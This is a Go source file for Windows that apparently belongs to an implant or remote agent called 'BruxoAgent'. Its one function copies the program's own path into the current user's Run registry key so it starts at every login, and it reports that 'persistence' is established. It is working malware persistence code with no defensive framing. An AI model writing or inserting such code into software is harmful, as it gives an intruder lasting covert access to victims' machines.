//go:build windows

package main

import (
	"os"

	"golang.org/x/sys/windows/registry"
)

func persistWindows() string {
	exePath, err := os.Executable()
	if err != nil {
		return "Error getting executable path: " + err.Error()
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return "Error opening registry key: " + err.Error()
	}
	defer key.Close()

	if err := key.SetStringValue("BruxoAgent", exePath); err != nil {
		return "Error setting registry value: " + err.Error()
	}

	return "Persistence established successfully via Windows Registry."
}
